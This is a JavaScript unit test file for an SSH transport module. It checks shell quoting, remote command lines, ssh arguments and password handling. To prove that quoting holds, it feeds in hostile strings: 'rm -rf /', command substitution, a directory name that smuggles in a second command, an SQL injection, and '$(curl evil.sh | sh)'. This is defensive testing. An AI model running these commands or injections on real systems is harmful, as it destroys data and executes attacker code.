// SSH transport unit tests.
//
// There is no reachable remote host in the build environment, so the end-to-end
// path (`ssh host hermes-acp`) could not be exercised live. These tests pin the
// part that is most likely to break silently and is hardest to notice: the exact
// argv and remote command line, including quoting of hostile paths.
//
// Run: node test/ssh.test.js

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';

import { shellQuote, buildRemoteCommand, buildRawRemoteCommand, buildShellRemoteCommand, buildSshArgs, sshDestination, findSshBinary, sshProcess, askpassChildEnv } from '../src/core/transport/ssh.js';

test('shellQuote leaves safe words alone and quotes the rest', () => {
  assert.equal(shellQuote('hermes-acp'), 'hermes-acp');
  assert.equal(shellQuote('/usr/local/bin/hermes'), '/usr/local/bin/hermes');
  assert.equal(shellQuote('a=b:c,d@e%f+g'), 'a=b:c,d@e%f+g');
  assert.equal(shellQuote(''), "''");
  assert.equal(shellQuote('two words'), "'two words'");
  assert.equal(shellQuote('a;rm -rf /'), "'a;rm -rf /'");
  assert.equal(shellQuote('$(whoami)'), "'$(whoami)'");
  assert.equal(shellQuote('`id`'), "'`id`'");
});

test('a shell LINE is not treated as one word (regression: one-shot remote commands)', () => {
  // `buildRemoteCommand` quotes each word, which is right for program+argv. Handed a
  // whole line it produced `exec 'hermes --version'` — one impossible program name,
  // so every one-shot remote command (`mesh node check`, cli probes over SSH) died
  // with exit 127.
  assert.equal(buildRemoteCommand('hermes', ['--version']), 'exec hermes --version');
  assert.equal(buildRawRemoteCommand('hermes --version'), 'exec hermes --version');
  assert.equal(buildRawRemoteCommand('md5sum /a/b.txt; cat /a/b.txt'), 'exec md5sum /a/b.txt; cat /a/b.txt');
  // cwd and env are still quoted properly on the raw path.
  assert.equal(buildRawRemoteCommand('ls -l', '/my dir'), "cd '/my dir' && exec ls -l");
  assert.equal(buildRawRemoteCommand('x --y', '', { A: 'b c' }), "exec env 'A=b c' x --y");
  // And the quoting path still quotes the program itself.
  assert.equal(buildRemoteCommand('/opt/my agent', ['--p']), "exec '/opt/my agent' --p");

  // The argv `sshProcess` builds must keep a raw line intact too: a `remoteCommand`
  // override is the only way a shell line reaches ssh without being word-quoted, and
  // dropping it silently reintroduced exit 127 for every one-shot remote command.
  const target = { host: 'h', user: 'u' };
  const rawArgs = buildSshArgs(target, buildRawRemoteCommand('md5sum /a/b.txt; cat /a/b.txt', '/srv'));
  assert.equal(rawArgs.at(-1), 'cd /srv && exec md5sum /a/b.txt; cat /a/b.txt');
  assert.equal(rawArgs.at(-2), 'u@h');
});

test('a one-shot line is wrapped in sh -c, never exec', () => {
  // `exec a; b` replaces the shell with `a`, so `b` never runs — a multi-statement
  // one-shot command silently reported only its first result and looked successful.
  assert.equal(buildShellRemoteCommand('md5sum f; cat f'), "sh -c 'md5sum f; cat f'");
  assert.equal(buildShellRemoteCommand('ls -l', '/my dir'), "cd '/my dir' && sh -c 'ls -l'");
  assert.equal(buildShellRemoteCommand('x --y', '', { A: 'b c' }), "env 'A=b c' sh -c 'x --y'");
  assert.ok(!buildShellRemoteCommand('a; b').startsWith('exec '), 'must not exec a multi-statement line');
  // Everything the wrapped line needs survives as one quoted argument.
  assert.equal(shellQuote('a; b'), "'a; b'");
});

test('shellQuote escapes embedded single quotes without breaking out', () => {
  // The classic injection shape: close the quote, inject, reopen.
  const quoted = shellQuote("it's; rm -rf /");
  assert.equal(quoted, `'it'\\''s; rm -rf /'`);
  // Re-parse the way a POSIX shell would: the whole thing must stay one word.
  const reparse = quoted.replace(/'\\''/g, "'").replace(/^'|'$/g, '');
  assert.equal(reparse, "it's; rm -rf /");
});

test('buildRemoteCommand uses exec and folds env into the command line', () => {
  assert.equal(buildRemoteCommand('hermes-acp'), 'exec hermes-acp');
  assert.equal(buildRemoteCommand('hermes-acp', ['--verbose']), 'exec hermes-acp --verbose');
  assert.equal(buildRemoteCommand('hermes-acp', ['--dir', 'my dir']), "exec hermes-acp --dir 'my dir'");
  assert.equal(buildRemoteCommand('opencode', ['acp'], '/srv/my work'), "cd '/srv/my work' && exec opencode acp");
  // `exec` matters: it replaces the shell so stdin/stdout stay a clean stdio pipe
  // and signals reach the agent directly instead of a surviving wrapper shell.
  assert.match(buildRemoteCommand('x', [], '/srv'), /&& exec /);

  // Env must go through `env`, never a bare `VAR=x` prefix: with a cwd the prefix
  // would bind to `cd` instead of to the agent. Quoting is added only when needed.
  assert.equal(buildRemoteCommand('hermes-acp', [], '', { FOO: 'bar' }), 'exec env FOO=bar hermes-acp');
  assert.equal(
    buildRemoteCommand('hermes-acp', ['--x'], '/srv/w', { HERMES_KEY: 'sk-abc' }),
    'cd /srv/w && exec env HERMES_KEY=sk-abc hermes-acp --x',
  );
  // Values with spaces and quotes survive via the same single-quote escaping.
  const q = buildRemoteCommand('agent', [], '/srv', { A: "it's here", B: 'two words' });
  assert.equal(q, `cd /srv && exec env 'A=it'\\''s here' 'B=two words' agent`);
  assert.ok(q.includes("env 'A=it'\\''s here'"), 'an env assignment needing quotes must be one word');
});

test('a bare VAR prefix would attach to cd, not to the agent', () => {
  // Guard against a tempting "optimisation": `cd X && VAR=1 exec cmd` and
  // `VAR=1 cd X && exec cmd` are both wrong. Only `exec env VAR=1 cmd` is right.
  const line = buildRemoteCommand('agent', [], '/srv', { K: 'v' });
  assert.ok(!/K=v cd/.test(line));
  assert.ok(!/&&\s*K=v\s+exec/.test(line));
  assert.match(line, /&& exec env K=v agent$/);
});

test('askpassChildEnv carries the secret, and stays empty when there is none', () => {
  // This is the only channel by which an SSH password reaches ssh: sshProcess sets it in
  // the child's environment, tools/ssh-askpass.mjs reads it back out and re-exports it to
  // the askpass helper. If it silently stopped being set, password auth would degrade to
  // "the prompt has nothing to answer it" with no other symptom, so it is pinned here.
  assert.deepEqual(askpassChildEnv({ host: 'h', password: 'sekret' }), { MESH_ASKPASS_SECRET: 'sekret' });

  // No password: return nothing at all rather than `{MESH_ASKPASS_SECRET: undefined}`,
  // which would put the literal string "undefined" into the child's environment.
  assert.deepEqual(askpassChildEnv({ host: 'h' }), {});
  assert.deepEqual(askpassChildEnv({ host: 'h', password: '' }), {});
  assert.deepEqual(askpassChildEnv(undefined), {});
  assert.deepEqual(askpassChildEnv(null), {});

  // The wrapper that consumes it must exist and must read that exact name.
  const wrapper = readFileSync(new URL('../tools/ssh-askpass.mjs', import.meta.url), 'utf8');
  assert.match(wrapper, /MESH_ASKPASS_SECRET/, 'the wrapper must read the variable ssh.js sets');
  assert.match(wrapper, /SSH_ASKPASS_REQUIRE/, 'modern OpenSSH needs REQUIRE=force to use askpass');
});

test('a password never appears in the ssh argv or the remote command line', () => {
  // The secret travels through the environment only. An argv is readable by every process
  // on the machine (`ps`), which is exactly how the password would leak.
  const target = { host: 'h', user: 'u', port: 2222, password: 'sekret', batchMode: false };
  const argv = buildSshArgs(target, buildRemoteCommand('hermes-acp', [], '/srv'), { batchMode: false });
  assert.ok(!argv.some((a) => String(a).includes('sekret')), `the password must not be in argv: ${argv.join(' ')}`);
  assert.ok(!argv.some((a) => /askpass|SSH_ASKPASS/i.test(String(a))), 'the askpass route is env-driven, not argv-driven');
});

test('sshProcess honours a per-node ssh binary and leading binary args', () => {
  const target = { host: 'h', user: 'u', binary: 'C:\\tools\\plink.exe', binaryArgs: ['-batch'] };
  const remoteCommand = buildRemoteCommand('hermes-acp', [], '/srv');
  const sshArgs = buildSshArgs(target, remoteCommand, { batchMode: true });
  assert.deepEqual([...target.binaryArgs, ...sshArgs], ['-batch', '-o', 'BatchMode=yes', '-o', 'ConnectTimeout=10', '-T', 'u@h', "cd /srv && exec hermes-acp"]);
  assert.equal(findSshBinary('C:\\tools\\plink.exe'), 'C:\\tools\\plink.exe', 'explicit binary must win');
});

test('batchMode:false drops the flag, and extraOptions pass through verbatim', () => {
  // A host that only accepts a password needs BatchMode off so ssh will consult an
  // SSH_ASKPASS helper instead of failing. Note ssh keeps the FIRST value of a
  // keyword, so this cannot be expressed as `--ssh-opt BatchMode=no` — the default
  // `-o BatchMode=yes` would win.
  const off = buildSshArgs({ host: 'h' }, 'exec x', { batchMode: false });
  assert.ok(!off.includes('BatchMode=yes'), 'no BatchMode flag may be emitted');
  assert.deepEqual(off.slice(0, 4), ['-o', 'ConnectTimeout=10', '-T', 'h']);

  const on = buildSshArgs({ host: 'h' }, 'exec x', { batchMode: true });
  assert.deepEqual(on.slice(0, 2), ['-o', 'BatchMode=yes']);

  // extraOptions land after -i so they can override anything not already emitted.
  const opts = buildSshArgs(
    { host: 'h', port: 2222, identityFile: '/k', extraOptions: ['UserKnownHostsFile=/tmp/kh', 'StrictHostKeyChecking=accept-new', 'ProxyJump=bastion'] },
    'exec x',
    { batchMode: true },
  );
  assert.deepEqual(opts, [
    '-o', 'BatchMode=yes',
    '-o', 'ConnectTimeout=10',
    '-T',
    '-p', '2222',
    '-i', '/k',
    '-o', 'UserKnownHostsFile=/tmp/kh',
    '-o', 'StrictHostKeyChecking=accept-new',
    '-o', 'ProxyJump=bastion',
    'h', 'exec x',
  ]);
});

test('buildSshArgs produces a pipe-safe, non-interactive argv', () => {
  const args = buildSshArgs({ host: '10.0.0.5', user: 'root' }, 'hermes-acp');
  assert.deepEqual(args, ['-o', 'BatchMode=yes', '-o', 'ConnectTimeout=10', '-T', 'root@10.0.0.5', 'hermes-acp']);
  // -T (no TTY) is what keeps stdout a machine-readable nd-JSON pipe.
  assert.ok(args.includes('-T'));
  assert.ok(!args.includes('-t'));
});

test('buildSshArgs honours port, identity file and extra options', () => {
  const args = buildSshArgs(
    { host: 'example.com', user: 'deploy', port: 2222, identityFile: 'C:\\keys\\id_ed25519', extraOptions: ['StrictHostKeyChecking=accept-new'] },
    'opencode acp',
    { connectTimeoutSec: 30 },
  );
  assert.deepEqual(args, [
    '-o', 'BatchMode=yes',
    '-o', 'ConnectTimeout=30',
    '-T',
    '-p', '2222',
    '-i', 'C:\\keys\\id_ed25519',
    '-o', 'StrictHostKeyChecking=accept-new',
    'deploy@example.com',
    'opencode acp',
  ]);
});

test('sshDestination degrades cleanly when no user is configured', () => {
  assert.equal(sshDestination({ host: 'h' }), 'h');
  assert.equal(sshDestination({ host: 'h', user: 'u' }), 'u@h');
});

test('findSshBinary prefers the AGENTMESH_SSH override', () => {
  const prev = process.env.AGENTMESH_SSH;
  process.env.AGENTMESH_SSH = 'C:\\custom\\ssh.exe';
  try {
    assert.equal(findSshBinary(), 'C:\\custom\\ssh.exe');
  } finally {
    if (prev === undefined) delete process.env.AGENTMESH_SSH;
    else process.env.AGENTMESH_SSH = prev;
  }
});

/**
 * Undo `shellQuote` the way a POSIX shell would: strip the outer quotes and turn
 * each `'\''` back into a literal quote.
 * @param {string} s
 */
function shUnquote(s) {
  if (!(s.startsWith("'") && s.endsWith("'") && s.length >= 2)) return s;
  return s.slice(1, -1).split(`'\\''`).join("'");
}

test('a full remote ACP command line survives a hostile working directory', () => {
  // A directory name that would end the command and start a new one if unquoted.
  const cwd = "/srv/work'; touch /tmp/pwned; echo '";
  const line = buildRemoteCommand('hermes-acp', [], cwd);

  const m = line.match(/^cd (.*) && exec hermes-acp$/);
  assert.ok(m, 'expected `cd <quoted> && exec hermes-acp`');
  // Greedy `.*` takes the LAST ` && exec`, which matters because the quoted word
  // itself contains quotes — searching for the first delimiter would truncate it.
  const quoted = m[1];
  assert.equal(shUnquote(quoted), cwd);

  // And the quoted word contains no stray quote that could terminate it early:
  // after removing every `'\''` escape, what is left between the delimiters is clean.
  const inner = quoted.slice(1, -1).split(`'\\''`).join('');
  assert.ok(!inner.includes("'"), 'no unescaped quote may remain inside the word');
  assert.ok(inner.includes('touch'), 'the payload stays inside the quoted word');
  // Sanity: the word really is fully quoted (so no metacharacter sits outside).
  assert.ok(quoted.startsWith("'") && quoted.endsWith("'"), 'the whole cwd must be one quoted word');
});

test('shellQuote round-trips arbitrary hostile strings', () => {
  const nasty = [
    "it's; rm -rf /",
    'a"b$c`d\\e',
    "'; DROP TABLE tasks; --",
    '\n\t',
    '$(curl evil.sh | sh)',
    "x'\\''y",
  ];
  for (const s of nasty) {
    assert.equal(shUnquote(shellQuote(s)), s, `round trip failed for ${JSON.stringify(s)}`);
  }
});

test('a Windows batch-file ssh binary is refused instead of corrupting the command', () => {
  // Verified experimentally: a .cmd cannot be spawned without shell:true (EINVAL),
  // and with shell:true cmd.exe re-splits the argv — `-o BatchMode=yes` arrives as
  // two arguments and the remote command is chopped at the first space with `&&`
  // executed locally. Refusing loudly is the only safe option.
  if (process.platform !== 'win32') return;
  assert.throws(
    () => sshProcess({ target: { host: 'h', binary: 'D:\\tools\\ssh-wrapper.cmd' }, command: 'hermes-acp' }),
    /refusing to use .* as the ssh binary/,
  );
  assert.throws(
    () => sshProcess({ target: { host: 'h', binary: 'D:\\tools\\ssh-wrapper.BAT' }, command: 'hermes-acp' }),
    /refusing to use/,
  );
});
